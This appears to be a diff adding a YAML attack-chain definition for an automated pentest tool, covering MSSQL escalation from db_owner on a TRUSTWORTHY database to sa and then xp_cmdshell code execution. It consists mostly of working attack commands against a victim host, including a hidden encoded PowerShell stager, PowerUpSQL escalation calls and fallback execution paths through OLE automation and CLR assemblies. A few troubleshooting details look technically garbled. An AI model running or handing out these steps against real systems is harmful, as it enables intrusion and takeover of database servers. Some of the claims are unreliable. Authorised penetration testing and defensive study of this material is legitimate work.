@@ -1,0 +1,75 @@
+chain_id: mssql_trustworthy_db_to_sa
+title: "MSSQL — TRUSTWORTHY database + db_owner → impersonate sa → xp_cmdshell"
+severity: HIGH
+tags: [mssql, trustworthy, db-owner, impersonation, sa, privesc, post-exploit]
+
+trigger:
+  any_of:
+    - { kind: "mssql_db_owner" }
+    - { kind: "mssql_low_priv_login" }
+    - { service_pattern: "(?i)mssql|ms-sql" }
+    - { port_in: [1433] }
+
+description: |
+  When a SQL Server database has `TRUSTWORTHY ON` (a developer convenience
+  for cross-DB module signing), a `db_owner` of that DB can create a
+  stored procedure that uses `EXECUTE AS OWNER` to run as the DB owner
+  at the server level — and if the DB owner is a high-priv login
+  (often `sa` because the DB was restored), they can switch context
+  to `sa` and turn on `xp_cmdshell` for SYSTEM RCE on the host. Common
+  in legacy ERP / app DBs that were lifted from prod with the bit set.
+
+steps:
+  - id: 1
+    title: "Find DBs with TRUSTWORTHY on (and you as db_owner)"
+    command: |
+      impacket-mssqlclient DOMAIN/USER:'PASS'@$VICTIMA -windows-auth
+      # In the SQL prompt:
+      SQL> SELECT name, is_trustworthy_on, suser_sname(owner_sid) AS owner FROM sys.databases;
+      SQL> SELECT IS_ROLEMEMBER('db_owner');  -- run after USE <db>
+
+  - id: 2
+    title: "Confirm the owner is high-priv (often sa)"
+    command: |
+      SQL> USE VulnDb;
+      SQL> SELECT system_user, original_login();
+      SQL> EXECUTE AS OWNER;
+      SQL> SELECT system_user, original_login();
+      -- 'system_user' now = sa  → game over.
+
+  - id: 3
+    title: "Enable xp_cmdshell from the elevated context"
+    command: |
+      SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+      SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+  - id: 4
+    title: "RCE as the SQL Server service account"
+    command: |
+      SQL> EXEC xp_cmdshell 'whoami';
+      SQL> EXEC xp_cmdshell 'powershell -nop -w hidden -enc <b64-stage1>';
+
+  - id: 5
+    title: "PowerUpSQL automates the discovery and exploit"
+    command: |
+      Import-Module .\\PowerUpSQL.ps1
+      Invoke-SQLAudit -Verbose -Username USER -Password 'PASS' -Instance $VICTIMA
+      Invoke-SQLEscalatePriv -Username USER -Password 'PASS' -Instance $VICTIMA
+
+common_errors:
+  - error: "TRUSTWORTHY on but EXECUTE AS fails with 'Cannot execute as the database principal'"
+    solution: |
+      The DB owner is broken (orphaned SID after a restore). Fix it
+      yourself: `ALTER AUTHORIZATION ON DATABASE::VulnDb TO sa;`
+      from the same db_owner context — then EXECUTE AS works.
+  - error: "xp_cmdshell returns 'cannot find component'"
+    solution: |
+      Server has `Ole Automation Procedures` disabled and doesn't
+      ship the xp_cmdshell DLL. Use the alternate path:
+      `EXEC sp_OACreate 'WScript.Shell', @s OUT;` to run via
+      automation procs, or via assembly upload (sp_add_assembly +
+      CLR proc).
+
+references:
+  - https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-trusted-databases/
+  - https://github.com/NetSPI/PowerUpSQL
